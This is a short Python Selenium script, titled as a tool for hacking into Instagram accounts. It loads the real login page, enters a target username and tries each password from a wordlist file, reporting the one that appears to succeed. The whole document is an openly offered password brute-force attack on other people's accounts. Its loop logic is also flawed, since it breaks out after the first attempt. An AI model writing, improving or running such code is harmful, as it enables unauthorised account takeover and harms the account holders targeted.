
# hacking into instagram accounts

from selenium import webdriver

from selenium.webdriver.common.keys import Keys

from selenium.webdriver.common.by import By

from selenium.common.exceptions import NoSuchElementException

from time import sleep

#webdriver = webdriver.Firefox()

#webdriver.get(‘https://www.instagram.com/accounts/login/’)

PATH ="C:\Python39\Scripts\chromedriver.exe"

webdriver=webdriver.Chrome(PATH)


webdriver.get("https://www.instagram.com/accounts/login/")

sleep(3)

# username = webdriver.find_element_by_name('scheril Ryl')
username = webdriver.find_element(by=By.NAME, value = 'username')

username.send_keys('randall') # write the username of account you want to hack.

# password = webdriver.find_element_by_name('password')
password = webdriver.find_element(by=By.NAME, value = 'password')

passfile=open('mat.txt','r')

def display(a):

    print("log in password "+a)

for i in passfile:

    try:

        password.send_keys(i)

        submit = webdriver.find_element_by_tag_name('form')

        submit.submit()

        c=webdriver.current_url

        sleep(5)

        b=webdriver.find_element_by_xpath("//button[contains(text(), 'Not Now')]")

        b.click()

        sleep(5)

        c=webdriver.current_url

    except NoSuchElementException:

     password.send_keys(Keys.CONTROL,"a",Keys.DELETE)

    sleep(5)

    url2=webdriver.current_url

    if c!=url2:

     display(i)

    break